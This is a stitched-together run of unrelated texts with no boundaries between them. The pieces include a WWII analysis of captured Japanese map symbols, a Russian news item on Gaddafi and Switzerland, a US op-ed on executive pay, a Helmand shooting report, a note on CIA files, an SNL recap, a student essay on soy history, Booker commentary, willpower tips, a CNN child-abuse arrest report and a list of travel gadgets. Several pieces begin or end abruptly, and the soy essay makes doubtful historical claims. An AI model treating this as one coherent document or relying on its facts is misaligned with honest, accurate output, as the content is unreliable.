It was apparently held by the 1st , 2d and 4th companies of a Japanese battalion , and fortified to cover an expected attack from the south , supported by airplanes from the eastward .
The script at the top reads , " S Island Garrison Unit Distribution Sketch . "
Under the island , the text is , " Zone of expected enemy landing ; " and at the right , " The battalion will place its strong - point on the southern edge of S Island and will annihilate the enemy at the shore which ( when it ? ) will attempt to land .
Second Lieutenant Odajima . "
Lt. Odajima was presumably an adjutant .
The symbols are rapidly sketched , and in some cases , do not conform to official examples .
Machine guns are indicated , for instance , by not the regulation .
Moreover , the communication net , shown by the solid and waved lines forming a rough diamond , are extremely deceptive , forcibly illustrating the point previously made that Japanese map symbols can not be read by a non-expert in the light of pure reason or logical deduction .
The regulation symbol for a telephone line is a thin , solid line , interspersed with the telephone symbol .
The symbol for a radio net is dotted lines and radio symbols .
Here we have the solid line marked not by the of the telephone , but by the of the radio .
Furthermore , the wavy line , immediately suggestive of radio vibrations , is marked with the telephone symbol not the radio character .
The explanation apparently is , that the maker of the original map rapidly ruled in the radio - net lines without bothering to make them dotted , being sure that those who used the sketch would interpret the solid line correctly because they connect radio symbols .
The waved , running line connecting the telephone symbols represents not radio vibrations but , " insulated wire . "
The light lines running out to sea among the off - shore wire entanglements are believed to indicate a shelving beach , suitable for hostile landing craft , but may be submerged obstacles .
In the oval of the 1st Co. defense area is an unaccounted for inner shaded oval corresponding to what may be the topmost contour .
It may mean shelter area .
The usual interpretation of such a symbol is " billeting area . "
At several points on the map are symbols that are quite similar to our own searchlight symbol , , placed where AA searchlights might possibly be expected .
These are also quite deceptive , as they mean , " occupied position . "
No searchlight symbol appears on the map .
The symbol for AAC artillery position may indicate the presence of one gun , or more .
At the bottom of the map , below the broad arrow , main - expected - attack symbol , colored red in the original , is the letter F meaning enemy -- Feind ( German ) .
No meaning is known for the faint , originally red , large character at the right resembling the figure 3 .
It may be an accidental scrawl .

( b) Guadalcanal Map
Figure 6 is a very careful copy of an original Japanese sketch of the American position on the Lunga River in Guadalcanal .
Unfortunately , the original was too faint for photographic reproduction .
The key to understanding this situation is the light curved line at 47,500 - - 49,500 which is the " Front line of friendly ( Japanese ) units , " drawn originally with a blue pencil .
The American positions were in red .
Obviously the terrain is rather rough , with a " cliff " marked at 49,300 - - 49,150 and patches of long grass scattered through the jungle .
Three antiaircraft positions are indicated , as well as numerous small defense areas with what appear to be slit trenches -- two actually inside the Japanese front line .
The emplacement symbol is the usual symbol for " field artillery protective works . "
For heavy artillery , the line would be doubled .
The " jungle " symbol is not shown in the lists of Japanese symbols available , or in TM 30 - 480 but the symbol given in figure 6 will shortly appear in a revised training manual .
The " A three meals and B one meal , " see below , is presumed to refer to the type ration carried by the assault troops .
" A " ration is rice , " B " , hardtack .
Some of the circles which are scattered over the area were colored red and some were not , possibly indicating unoccupied or alternate positions .

( c) Translation of Japanese Characters on Guadalcanal Map
1. Time of assault 22.17 ( 10.17 PM ) .
2. " A " ration , rice , three meals ; " B " ration , hardtack , one meal .
3. Material for construction of airfield has been landed at this point .
This is the best anchorage in this island since it is protected from the wind .
4. Transmitting station .
5. Grassland -- used as dummy airfield provided for hostile bombing .
6. HYO -- Leopard .
7. Cliff .
8. Power plant No. 2 .
9 . Remains of reef ( across the river ) .
10 .
There are fording areas at various places .
Flow of river is somewhat rapid .
Light river - crossing equipment must be carried .
11 . KUMA -- Bear .
12 . SHISHI -- Lion .
13 . Lunga River .
14 . Runway .
15 . Shelter for fighter planes .
16 . Two pieces of 12 - cm howitzers ( literal trans ) .
17 . Both banks are 2 to 6 meters above water level .
River bed is sand and gravel .
18 . This hill , 20 to 30 meters in elevation , is flat at the top and commands the area to the north .
19 .
This hill is 20 to 30 meters in elevation .
From it may be seen the airfield .
The grass of the lowland is a little over shoulder high .

БЕРН , 3 сентября .
Ливийский лидер Муаммар Каддафи считает , что Швейцария не имеет права на существование как независимое государство , и предлагает разделить ее между соседними странами , включив кантоны в их состав по языковому признаку .
Об этом сообщает Swissinfo
Каддафи настроен решительно .
Предложение о разделе Швейцарии он намерен представить на Генассамблее ООН .
С его точки зрения , часть кантонов должна отойт и Франции , часть – Германии , а часть – Италии .
Комментируя заявление ливийского лидера , заместитель председателя швейцарской комиссии по внешней политик е
Криста Марквальдер отметила , что если Ливия действительно решит внести такое предложение на Генассамблее ООН , репутация и имид ж Швейцарии могут сильно пострадать .
В этом году Каддафи будет участвовать в работ е Генассамблеи ООН впервые с момента прихода к власти 40 лет назад .
Его речь запланирована на 23 сентября .
Дипломатическая война Ливии со Швейцарией продолжается уже давно .
Все началось с того , что летом прошлого года в одном из швейцарских отелей полиция арестовала сына ливийского лидер а Ганнибала Каддафи и его жену .
Обоим были предъявлены обвинения в избиении прислуги .
Триполи отозвал из Берна своих дипломатов и произвел аресты нескольких швейцарцев в Ливии .
Ливия отозвала все средства , размещенные на ее счетах в швейцарских банках и прекратила экономическое сотрудничество со Швейцарией .
В Швейцарию прекратили поставлять ливийскую нефть .
Прежде Ливия обеспечивала треть потребностей конфедерации в « черном золоте » .
Служащие отеля отозвали заявления об избиениях из швейцарской прокуратуры , получив крупную компенсацию , размеры которой не сообщались .
What ’s more infuriating : a government “ pay czar ” who can dictate the salary of private - sector citizens or some corporate welfare queen having the nerve to complain about a salary cut ?
On a gut level , it ’s a tough call .
Watching the same swine that begged for charity after spearheading the devastation of their respective companies take a massive salary cut is thoroughly satisfying .
Yet , in a broader sense this unprecedented intrusion into the economy accomplishes nothing — well , other than setting an array of dangerous precedents .
Who knew ?
Chicken - little governance comes with a steep price tag .
Could anyone have imagined , even two years ago , that an unaccountable pay czar , Kenneth Feinberg , would have the authority to dictate the salaries of private - sector employees ?
Yes , these companies were at the taxpayer trough .
Which means that firms that accept aid from Washington should consider the “ assistance ” analogous to the help offered by the Godfather at his daughter ’s wedding .
You ’re in for life .
Existing contracts have no real value .
A single political appointee may have the power to decide what you ’re worth .
And what if the companies that accepted bailouts — Citigroup , Bank of America , American International Group , General Motors and others — never pay back taxpayers ?
Do they answer to the White House in perpetuity ?
To the astonishment of absolutely no one , Neil Barofsky , the special inspector general for the Treasury , tells us that the American taxpayers are n’t likely to recover hundreds of billions of dollars they “ invested ” to bail out financial institutions , Detroit automakers and bubble - inducing homeowner programs .
“ While several TARP recipients have repaid funds for what has widely been reported as a 17 percent profit , ” Barofsky further explained to a Senate committee recently , “ it is extremely unlikely that the taxpayer will see a full return on its TARP investment . ”
If TARP recipients are under the thumb of a pay czar , what about other corporations consenting to Washington aid or accepting contracts — a group that grows with each misguided stab at stimulating the economy ?
And why stop there ?
Why not make all compensation fair ?
“ I do n’t think that ’s healthy , and I do n’t like it , ” Camden Fine , president of the Independent Community Bankers of America said of the pay czar ’s cuts .
“ These are decisions for boards of directors to make , not the government .
I think this is a very slippery slope . ”
Who greased this slimy incline of government intrusion by begging for handouts ?
They did .
Yet , the slippery slope argument is difficult to deny when the Wall Street Journal already reports that New York Democrat Chuck Schumer plans to press for legislation extending the pay czar ’s governance to all publicly traded companies .
Let ’s not forget that the compensation of many of these CEOs would have ended up at absolutely zero had the market dictated their terms rather than Washington .
Today , many CEOs , no doubt , feel comfortable taking outsized bonuses and compensation exactly because they know full well that failure is not an option .
Washington wo n’t allow it , artificially propping up incompetence .
“ If the administration actually follows through , ” writes Alex Tabarrok , an economist at George Mason University and blogger at the popular MarginalRevolution.com , “ most of these executives will quit and get higher paying jobs elsewhere .
Executives not directly affected by the pay cuts will also quit when they see their prospects for future salary gains have been cut .
Chaos will be created at these firms as top people leave in droves .
Will the administration then order people back to work ? ”
Hey , why not ?
Despite this undercurrent , the administration continues to expand needless intervention and “ investments ” into the economy that offer only the illusion of safety and a reality of stagnation .
And that ’s exactly what empty words , unlimited taxpayer funding and uninhibited regulatory power can buy you .

SANTA FE , N.M. – Following a demonstration of 3,200 educational employees and allies in early October here , New Mexico teachers returned to the state Capitol , the Roundhouse , Oct. 17 in order to reinforce their demands of no education budget cuts .
After a spirited picket line around the Capitol , teachers , students and friends went inside the legislative chambers to observe how their legislative representatives voted and spoke on statewide education budget cuts .
Progressive legislators made valiant attempts to give voice to the teachers ’ and students ’ demands to close tax loopholes for out - of - state corporations .
These corporations export their profits out of state in order to avoid paying taxes to the state of New Mexico .
The tax proposal was defeated by a combination of Republican and conservative Democratic legislators .
To legislate efforts to curtail the profits of outfits such as Wal - Mart , Target and K - mart , seemed like blasphemy against the holy order of capitalism , one participant observed .
Stay tuned for further developments in the struggle for protecting public education in New Mexico .
[ Editor 's Note :
This article has been updated to reflect the fact that Capt .
Tim Dirk is a member of Task Force Helmand . ]
LASHKAR GAH , Helmand —
No one knows what made him snap .
Some say he was a Taliban infiltrator , others cite anger and frustration against British military tactics .
But just after 3 p.m. on Nov. 3 , a young police officer named Gulbuddin picked up a machine gun and killed five British soldiers , wounding another six .
He then escaped , leaving both international and Afghans forces trying to piece together how and why such a thing could happen .
The shootings occurred in Nad Ali , a district of Helmand just 15 kilometers from the provincial capital , and the front line in the war with the Taliban .
British soldiers were relaxing with their Afghans colleagues , having just come back from patrol and eaten a meal .
Suddenly Gulbuddin started firing in rapid bursts .
He dropped the gun and escaped before the British had time to react .
“ We do not know what triggered this , ” said Haji Manan , the local commander in Nad Ali , the district where the incident occurred .
“ We were sitting at our checkpoint and we heard shooting .
My deputy grabbed a gun a gun and rushed out .
Gulbuddin knocked him down with his machine gun .
I ran up to the roof and I was shot .
But I rolled down off the roof , he thought I was dead .
He shot the foreigners first , then us . ”
No one knows exactly where Gulbuddin is now .
A local Taliban commander said that the policeman had gone to them for refuge , and was now under the protection of the insurgents .
“ After he killed the British soldiers he came to us , ” said the commander , who spoke on condition of anonymity .
“ We picked him up near a cemetery , just three kilometers away from the police checkpoint , in an area under our control .
He has been taken away to an undisclosed location .
We did not have ties with him before , but recently he started to open relations with us . ”
A member of the local shura , or council , who did not want to give his name , told IWPR that the police were searching even behind the Taliban lines to find Gulbuddin .
“ There are talks going on between tribal elders and the local Taliban to turn him over to the police , ” said the man .
But most Helmandis think it is unlikely that the Taliban will give him up voluntarily .
“ That boy is a hero , ” said Khial Mohammad , a resident of Greshk .
“ The Taliban will treasure him like a flower . ”
Gulbuddin was not an obvious risk , according to his colleagues .
A graduate of the Helmand police academy , he had served with honor for two years in various districts of the province .
He was a large man , and strong , with a reputation for fierceness in fighting the Taliban .
His commander called him “ trustworthy . ”
Now they are trying to understand how it all could have gone so badly wrong .
“ Gulbuddin was a soldier like me , ” said Khairullah , one of the police who was wounded .
“ He did not have psychological problems , and he was not an addict .
He was a disciplined policeman .
Nobody knows why it happened .
A resident of Nad Ali who knew him well said that Gulbuddin was a fighter .
“ He was a veteran of many battles against the Taliban , ” said the man , who did not want to give his name .
“ He deserved medals .
But he told me that whenever they had the Taliban pinned down the British would call them off .
Maybe he was ready for a fight and his nerves just short - circuited . ”
Capt .
Tim Dirk , a member of Task Force Helmand , would not comment on British military tactics .
“ I cannot possibly know what happens in the heat of battle , or second guess what decisions are made , ” he said .
The Afghan police were shocked and ashamed by the mayhem .
“ I cannot look anybody in the eye , ” said a police officer in the ANP headquarters , in Lashkar Gah .
“ The British will not trust any of our soldiers after this .
We killed people who were trying to help us . ”
For now the British are saying that Gulbuddin was a “ rogue policemen ” and the Nad Ali shootings are an isolated tragedy , not part of a larger pattern .
But too many Helmandis are applauding the act rather than condemning it .
The years of war have made many Afghans angry and bitter against the foreign presence on their soil .
Tensions between the British and the Afghans in Helmand are deep , and go back almost two centuries , to the three previous wars the British fought , and lost , on Afghan soil .
So it may not be surprising that Gulbuddin is being hailed as a hero in some circles .
“ He is a good boy , and the parents that bore him should be proud , ” said haji Gul Agha , another resident of Greshk .
“ He should be given a medal .
Let the foreigners know the pain of losing your own people .
Let them know how death smells . ”
Civilian casualties are a major irritant in the relationship , and the day after the shooting a new incident triggered fresh outrage .
The patience of many has snapped , and they see the deaths of the British soldiers as payback for the lives of innocent Afghan civilians .
“ Let them know how tragic is the death of a son , a father or a brother , ” said Abdul Majid , a resident of Greshk district in Helmand .
“ Just last night they bombed innocent people in Babaji .
Did n’t they have fathers and mothers ?
They were just farmers , threshing corn , and they were killed on the spot .
All their young sons are dead .
I am sure they would welcome that soldier as a hero . ”
According to the Helmand PRT , the incident Majid referred to occurred at about 7:30 p.m. on Nov. 4 , when the international forces launched a rocket attack against people they believed to be insurgents .
“ We killed nine individuals who were attempting to plant an IED ( improvised explosive device ) , ” Dark said .
“ I am not aware of any civilian casualties . ”
But this version is not sitting well with Helmandis , who say that nine civilians were killed , including three children , as well as eight insurgents .
A group of 60 tribal elders went to the PRT , the governor ’s office , and to a local hospital in Lashkar Gah , the provincial capital , to protest the attack , and according to media reports , they had the bodies of the civilians with them .
President Hamid Karzai has condemned the attack and called for an investigation .
Mohammad Ilyas Dayee contributed to this report .
Security remains tense in the capital after President Hamid Karzai agreed to face his rival Abdullah Abdullah in a second round of voting on Nov 7 .
Both men said yesterday they were determined to press ahead with the election despite hopes in Washington that they might come to an agreement over the make - up of a future government that would dispense with the need for a second vote .
The CIA is fighting to prevent the release of hundreds of documents involving its funding of an anti-Castro group in New Orleans that engaged in well - publicized clashes with Lee Harvey Oswald in the summer of 1963 .
The New York Times reported on Friday that the files “ involve the curious career of George E. Joannides , the case officer who oversaw the dissident Cubans in 1963 .
In 1978 , the agency made Mr. Joannides the liaison to the House Select Committee on Assassinations — but never told the committee of his earlier role . ”
ADVERTISEMENT
Joannides was the deputy director for psychological warfare at the CIA ’s Miami station , JM / WAVE , which was the center of anti-Castro activities in the early 60’s and served as a spawning ground for figures who would later be involved in covert operations in Vietnam and in Iran - Contra .
In 1963 , Joannides worked closely with leaders of the the Directorio Revolucionario Estudantil and exercised a significant degree of control over the group ’s leaders .
Former Washington
Post reporter Jefferson Morley has been engaged since 2001 in a battle to learn move about the dual role placed by Joannides , which has raised suspicions that he was part of a coverup .
“ I know there ’s a story here , ” Morley told the Times .
“ The confirmation is that the C.I.A. treats these documents as extremely sensitive . ”
In December 2007 , a Court of Appeals panel ordered the CIA to reveal its files on Joannides , and some documents were released last year confirming Joannides ’ role in New Orleans .
However , the CIA is still withholding or even refusing to confirm the existence of hundreds more .
This past July , Morley wrote , “ Last week , I did my part to hold the CIA accountable .
I filed my sixth (! ) declaration in connection with Morley v. CIA , my ongoing lawsuit against the agency seeking records related to the assassination of President John F. Kennedy . …
The Joannides file , say a diverse group of JFK authors , are part of the assassination story and should be made public .
For six years , the CIA has refused , alleging their release would harm ‘ national security . ' ”
Morley ’s quest has gained prominent supporters , including even anti-conspiracy assassination scholar Gerald Posner , who believes that the CIA ’s secretiveness is feeding into conspiracy theories .

G. Robert Blakey , who served as staff director to the House Select Committee on Assassinations , told the Times , “ If I ’d known his role in 1963 , I would have put Joannides under oath — he would have been a witness , not a facilitator . …
How do we know what he did n’t give us ? ”
NBC ’s Saturday Night Live spoofed President Barack Obama for the second week in a row on Saturday , declaring in a sketch that the president won the Nobel Peace Prize for not being George W. Bush .
“ Jimmy carter won it for decades of trying to find solutions to international conflicts , ” said actor Fred Armisen , playing Obama .
“ Al Gore won it for his years of educating the US about climate change .
And us ?
Well , I won it for not being George Bush . ”

He added : “ This award was as a complete surprise , as I have only not been George W. Bush for nine months . ”
The Obama character said he did n’t receive a call from the Nobel committee before the annnouncement , but wished he had , so he could say to Hillary Clinton , “ Hey , remember that 3 a .m. call you were so worried about ?
It happened .
Nobel Peace Prize . ”
Armisen ’s Obama went on to announce that he had also just won $ 70 million in the Powerball lottery , and “ it was the first lottery ticket I ever bought . ”
He said he would decide what to do with the money by conferring with his economic adviser Larry Summers , Treasury Secretary Tim Geithner and Federal Reserve Chairman Ben Bernanke , “ because those guys do not make mistakes . ”
The previous week , in another Armisen sketch , SNL accused Obama of having done nothing in the first nine months of his presidency .
Mindful of the potential influence of SNL mockery , CNN declared that sketch to be “ the end of Obama ’s honeymoon . ”

The History of Soy
The soybean has a long history and a very long journey through out the world .
This journey , lasting almost 27 centuries , changed the world that we know today .
Soy products feed a large part of nearly every country 's inhabitants , as well as various non-edible uses .
The soybean was first cultivated by the Chinese .
It then spread further throughout China and to other countries around it .
Some time after the domestication of the soy plant , Europeans too learned about the uses of the soybean and they started to grow it .
Much later , with a hand from Benjamin Franklin , the soybean made it 's journey to America .
The soybean has had a lengthy journey , and one that has effected the whole world .
Soybeans were first used as early as the 11th century BC by the Chinese .
Soybeans were honored by the ancient Chinese and the emperor Sheng - Nung named it as one of the five sacred plants .
Included with soybeans rice , wheat , barley , and millet .
Soybeans were used in this early civilization both as food and also as a medicine .
Perhaps the soybean actually helped cure sicknesses because of the vitamins that it contains .
Centuries after the soybeans were being used by the Chinese , they were domesticated and it is now said that they could be one of the first crops ever to be grown by humans .
It was n't long after this when the rest of the world learned about the benefits of the soybean .
Hundreds of years after the Chinese first discovered the uses of the soy bean and the domestication of the soy plant , other parts of the world started using the soy bean too .
By the first century countries such as Korea started using the soybean .
Soybeans also became more widely used throughout china and had spread to Central and southern china .
It want until the 7th century when many other countries started using the soy bean such as Japan , Indonesia , the Philippines , Vietnam , Thailand , Malaysia , Burma , Nepal and northern India .
Soy was commonly used as an ingredient in the early ages of it's history and was used to make tofu , miso , and tempeh .
Meanwhile the other European countries still were still not using the unfamiliar bean .
Long after Asia had started using the soybean , in the 17th century , Europeans started using the bean that they had seen in travels to Asia .
Yet , even then all they did was import soy sauce from China .
Finally by the 18th century soybeans were being grown in European countries .
Much later , the first soy plant touched American territory .
In 1770 Benjamin Franklin sent his friend , a botanist , seeds of a soybean .
Unfortunately Franklin's attempt was unsuccessful to spark the interest of America .
The true time when soybeans were finally introduced into America was when a ship full of soy plants used as ballast landed at a dock .
A few farmers interested in the plant decided to try and grow them , at last the soybean was being grown in America .
Since 1929 the soybean crop has increased form 9 million bushels to over 2.8 billion bushels .
In America soybeans began to flourish flourish , on the farms and on the markets .
In 1904 George Washington Carver a famous chemist discovered that soybeans contain large amounts of protein and oil .
Later on in 1919 William Morse helped found the American Soybean Association .
Henry Ford known for making automobiles made a car with all of the plastic made from soybeans !
However it was n't truly until the 1940's when Soybean farming rocketed .
Soy has a long history and despite it 's long journey , it still can not rest , for even today , people are still finding new uses for soybeans .

So there it is : for the first time in a decade , the bookies ' favourite has romped away with the laurels .
Hilary Mantel 's revisionist history of the life of Tudor arch - villain Thomas Cromwell , Wolf Hall , has won the 2009 Man Booker prize , and I for one could n't be happier about it .
On a remarkably strong shortlist , her novel stood out for me – as the most imaginative , the most ambitious , the most complete .
She has taken a well - known – even well - worn – story and injected it with thrumming vitality : reproducing the sights , sounds and pungent smells of London in the 16th century ; recomplicating characters that have been worn down , over hundreds of years , to attenuated , if gaudy , ciphers .
She 's also , by the by , managed to sneak a ' genre ' novel into the Booker winners ' notoriously literary paddock - and recalibrated the arena of historical fiction in the process .
The accusation that this year 's shortlist was weighted too heavily towards the historical has dogged the debate surrounding it , but even those who found Wolf Hall mannered or boggy – and there were plenty who did ; the Observer 's literary editor William Skidelsky among them – agreed that Mantel 's novel was a far more exciting proposition than the usual ladies - and - lances epics that the genre turns out .
This is an acute and implicating psychological study of a man whose individual actions are sympathetic even if his trajectory is deplorable ; whose mind is brilliant and beguiling even if his motives are black .
It 's subtle and compelling , and above all unputdownable .
Ahem !
In my opinion , anyway .
But enough of that - what did you all make of it ?
It was , after all , up against a really stellar shortlist – in particular , I loved Simon Mawer 's The Glass Room , which offered an elegant , light - filled counterpoint to Mantel 's scheming Tudor murk .
Did the right woman win ?
Willpower .
Self - control .
Self discipline .
These are many names that all mean the same thing : having the mental strength and attitude to consciously do the things you know you must do .
Yes – even when you do n’t emotionally want to .
When you learn how to improve your willpower , you learn how to strengthen a skill that helps across your live .
Improved willpower is associated with being happier , scoring higher on standardized tests and earning more money .
Willpower is also highly correlated with accomplishing personal goals .
What you may not know however , is that willpower is a resource that you can call upon – and at the same time , it is also a skill that you can improve .
I ’ll show you seven scientific , research backed way you can improve your own personal self discipline today
# 1 : Remove Temptation
Willpower is a limited resource – so do n’t waste it .
Everytime you need to tell yourself “ no ” to a temptation in front of you , you slowly deplete your willpower – and it takes time to replenish .
So whenever possible : remove the temptations from your life .
For example , if you know that you watch too much TV , and need to focus on a project for the next month – cancel your cable , or physically unplug your TV from the wall .
As a personal example , I know I ’ll eat junk food if it is in the house – so I never keep any in my home .
# 2 : Stabilize Blood Sugar
Low blood sugar is associated with diminished self discipline .
Avoid eating sugary foods such as candy or high sugar drinks .
Of course , it ’s a bit of a catch 22 – it takes self discipline to avoid eating tasty , sugary foods to begin with !
# 3 : Sleep
Make sure you get enough of it .
Research has shown that the ability to maintain focus on tasks suffers due to lack of sleep .
# 4 : Enjoy Life
Positive emotional experiences replenish your self discipline reserve .
So throughout the day – take a few moments to enjoy your life
I love to take breaks and run , play guitar , hike and do other activities that inspire me – find what works for you .
# 5 : Avoid and Reduce Stress
Stress has shown to deplete self discipline .
Reducing commitments , breathing exercises and yoga has personally helped me reduce stress in my life .
# 6 : Have a Plan
Research shows that when your willpower starts getting depleted , having a plan and a goal you are chasing can help mitigate the effects of lowered willpower .
In The Action Solution , I take you step by step through how to set a path for your life and a specific plan to achieve it .
I use the same process in my own life – and I am sure it has resulted in maintaining a higher level of willpower and achievement in my own life
People with good plans still fail – it ’s no guarantee you ’ll succeed , but it definitely makes it more likely .
# 7 : Self Affirmations
Similar to positive emotional experiences , self affirmations have been shown to help replenish depleted willpower .
I like using my start pages .
I built them specifically so I could focus on a single thought and purpose .
My favorite at the moment is value your time .
# 8 : Bonus : Strengthen Your Willpower
Self discipline is a muscle – focus on small tasks that you can control , and your ability to stick to larger tasks will slowly increase .
Some examples of exercise include straightening your posture and using your non-dominant hand for tasks .
For example , try brushing your teeth with your non-dominant hand .
Try switching which hand you hold dishes in , and which hand you scrub dishes in .

Swan – Between Two Points [ OFFICIAL ]
( CNN ) --
A man who for 20 years has lived near one of six men accused of sexually abusing young relatives said he finds the allegations " absolutely unbelievable . "
Bob Ramsey , a retired Graceland University chemistry professor and David Mohler 's neighbor in Lamoni , Iowa , said he knows most of the Mohler family .
Burrell Edward Mohler Sr. , 77 , and his sons Burrell Edward Mohler Jr. , 53 ; David A. Mohler , 52 ; Jared Leroy Mohler , 48 ; and Roland Neil Mohler , 47 , were arrested Tuesday on suspicion of sexually abusing children .
A sixth family member , Darrel Wayne Mohler , 72 , was arrested Friday as he pulled into the driveway of his Silver Springs , Florida home .
Darrel Mohler , the younger brother of Burrell Edward Mohler Sr. , is being held in jail in Marion County , Florida , charged with two counts of rape in a Missouri arrest warrant .
The six alleged victims -- all now adults -- came to law enforcement authorities with stories of sexual performances , mock weddings , rape with various objects and a forced abortion during their childhoods , according to court documents obtained by CNN affiliate KSHB in Kansas City , Missouri .
None of the accused in the case has entered a plea and it's unclear whether they have legal counsel .
" David was one of the kindest people I know in this town , " Ramsey said .
" I find it absolutely unbelievable .
That 's my honest opinion . "
Ramsey said he and Burrell Edward Mohler Sr. , 77 , attended college together 50 years ago .
Ramsey said he spent a lot of time with the family because his wife had taught piano to two family members .
" They were in and out of our home quite a bit , and there was absolutely never any indication of abuse , " he said .
The employer of one of the suspects said , " Everybody is still in shock ... disbelief , " as news of the arrests spread through communities where several of the suspects live in western Missouri .
" He was a good medic , " Corbin Allred said of Roland Mohler , who has been employed at Saline County Ambulance District No. 3 since 2006 .
Mohler has been suspended , Allred said , and further action may be taken at the next board meeting .
Allred described Roland Mohler as outgoing and said , " He blends in with everybody else . "
Roland Mohler was on duty when Missouri State Highway Patrol officers arrested him , Allred said .
Paramedic Sharon Roscher was also shocked about allegations that one of their own could be involved in something so horrific .
" You eat , you sleep , you do everything with people for 48 hours , " she said .
" Oh my gosh , it 's just a shock . "
Roland Mohler 's father , Burrell Edward Mohler Sr. , also worked for a time in emergency services as a firefighter in Independence , Missouri , the fire department confirmed .
A spokesman would not comment further .
Burrell Mohler Sr. , David Mohler and Jared Mohler are lay ministers in the Community of Christ , the organization said .
" Leaders and members of the Community of Christ in the greater Kansas City area are prayerfully upholding those families that are touched by the recent arrests of five members of the Mohler family , " the statement said .
Lay ministers are volunteers who do not receive compensation , and none of the three served in leadership roles or worked with children , according to the organization , which is based in Independence , Missouri .
" We have a very strict code of ethics when it comes to the safety of our youth , " said the organization 's spokeswoman , Linda Booth .
Burrell Mohler Sr. did go through the group 's registered youth worker program , but " his youth worker registration has been terminated and we understand he had no contact with children or youth in church programs , " the church said .
Some lay ministers might help take care of the church , Booth said , while others might speak at services .
" Immediately , I went to the rolls and had their priesthoods suspended because that 's what we do in the Community of Christ when there 's any word of something like this .
We suspend their priesthoods , " Booth said , referring to a church designation for male members .
" If this goes to trial and they are convicted , then they will be what we call silenced , and they can no longer represent the church in any way , " Booth said .
The Community of Christ is an offshoot of the modern - day Church of Jesus Christ of Latter - day Saints .
It split off from the Mormon church in the 1800s , and in 2000 changed its name to Community of Christ from the Reorganized Church of Jesus Christ of Latter - day Saints .
" I personally feel grief for these families , all the families that are involved in this , " Booth said .
" I feel concern for the congregations . "
She said she is also " concerned about the greater church , the Community of Christ who represents nations and communities based in love and peace and joy . "

Whether you ’re a casual business traveler only taking trips for things like industry conferences or you ’re a regular business traveler , you probably know about all of the basic business travel products — luggage , laptop bags / briefcases , plugs and adapters , etc .
But sometimes the basics are n’t enough .
Here are ten cool business travel gadgets and other business travel products you might not have yet .
1. USB Rechargeable Batteries
Do you hate having to carry extra batteries with you when you travel , whether for a camera , cell phone , or something else , just because you can never be sure when you ’ll have access to a charger ?
If so , USB rechargeable batteries might be a perfect business travel product for you .
No bulky recharging docks necessary — you just charge the batteries through your laptop or other USB compatible device .
Right now you can only get AA USB rechargeable batteries called USBCELLs , but in the future , USBCELL.com will also be releasing AAA , 9 volt , and cell phone batteries that can be recharged using your USB device .
2. Trackstick
Are you terrible with directions ?
Does your company want to keep better track of your business travel ?
In either case , you might want to consider taking a Trackstick with you on your next business trip .
These little GPS trackers come in several varieties from personal trackers to pro models .
Set them up in your rental car with a clear view of the sky , and your Trackstick will remember your driving routes .
Just plug it into a USB port on your laptop if you get lost and need to retrace your steps ( the Trackstick exports your GPS data to Google Maps for you ) , or bring it back to the office so your employer can download and export travel data for company records .
3. Trace Me Luggage Tracker
Have you ever lost your luggage while traveling for business ?
Worse , have you ever lost your luggage and not gotten it back ?
If so , this handy little business travel product might leave you resting easier .
Never worry about untraceable luggage again .
With the durable Trace Me Luggage Tracker tags attached to your bags , you wo n’t have to worry about them falling off .
The barcode on the tags ties your luggage to your unique registration details in a database accessed by luggage handling personnel and law enforcement agencies .
Why should your belongings end up auctioned off because of a little airport mishap where your bags ca n’t be traced back to you ?
Never again with the Trace Me Luggage Tracker !
4. Iqua SUN Solar Powered Bluetooth Headset
Whether you ’re an eco-conscious business traveler or simply an efficient one who does n’t want to load down luggage with unnecessary chargers and cables , a solor powered Bluetooth headset could be a good product for you on your next business trip .
The Iqua SUN was the world ’s first solar powered Bluetooth headset , and it can be charged on either outdoor or inside light ( so do n’t worry if you face a few gray days on your trip ) .
Technologically sound , space - saving , and environmentally friendly — what more could you ask for in a business travel gadget ?
5. Electronic Translator
If your business traveling consists of visiting several international locations , and you do n’t speak the languages fluently , an electronic translator like the Nyrius 12 Language Talking Translator might come in handy .
The biggest perk of this electronic translator over others is that it ’s a talking translator .
Not only can you see the translations , but you ’ll learn how to say the words properly when asking the locals for help , ordering a meal , or getting directions .
6. Flat Resistance Bands
Not all business travel products have to be cool little gadgets .
Sometimes it ’s about simplicity .
That ’s the case when you want to continue your workouts away from home on business trips .
Resistance bands are natural options .
They ’re portable and lightweight , and can give you a good workout in confined spaces like hotel rooms .
However , the popular tube - style resistance bands with handles can be a bit too bulky when packed in your luggage .
These flat resistance bands do the trick .
They can be folded flat and stored in sealed plastic bags ( to keep the rubbery smell away from clothing ) , and they take up less room in your suitcase .
7. Amazon Kindle / Amazon Kindle DX
I ’m actually not a supporter of e-book readers in general ( for many reasons , one being that they ’re just another piece of technology to be stuck carrying around when other options exist that can do the same thing and more , with similar sizes , and for similar price ranges ) .
However , if you normally take long flights for business traveling , and you like to carry a few magazines on board with you , then a Kindle might at least save you some space and weight of lugging the paper versions around .
You can get the regular Kindle if your biggest concern is compact space , or if you want a larger reading area , you can try the Kindle DX ( both pictured below ) .
8. Instant Cell Phone Charger
Chances are good that your cell phone will be glued to your ear during a significant portion of your business trip — checking in with clients , checking back in with the office , etc .
There ’s also a chance you ’ll find yourself in a situation at least once where your battery is dying and you do n’t have access to an outlet or charger ( it never fails to happen when you ca n’t afford it to ) .
If that ’s a concern for you , a simple and affordable option exists — instant cell phone chargers like the Eveready Energizer Energi instant cell phone charger pictured below .
For less than ten bucks you ’ll have a backup plan when your cell phone unexpectedly needs a jolt of juice .
9. Airline Comfort Set
Traveling on a cramped airplane is no excuse not to be as comfortable as you can .
You should be well - rested and in the right mindset for work when you arrive at your destination .
One of the best ways to do that is to either purchase an airline comfort set like the one pictured below , or put your own together ( just combine your favorite compact pillow , lightweight blanket — you do n’t want it to take up too much room in your bag , so a throw works nicely , and an eye mask ) .
You could throw in some earplugs or headphones and your favorite mp3 player too , and enjoy as peaceful a flight as possible .
10 . Global Phone
Sometimes your regular mobile phone is n’t enough .
If you travel internationally for business regularly , a global phone is a must - have business travel gadget .
While you can rent them , the cost really adds up .
If you ’ll be traveling overseas more than once this year , it might be worth investing in your own .
The model pictured below is the National Geographic Talk Abroad Duet Travel Phone .
It comes with a UK - based phone number setup , and allows you to receive free incoming calls in over 60 countries while you ’re away ( making it easy to keep in touch with the boss back in the office while better managing costs ) .
This model has dual SIM card capabilities , allowing you to add an extra line for local calls if you prefer .
What other business travel gadgets or other business travel products do you consider must - haves when going on a business trip ?

* 80 percent cut is Finland ’s first fixed target to 2050
* Aim is part of “ wider international effort ” before accord
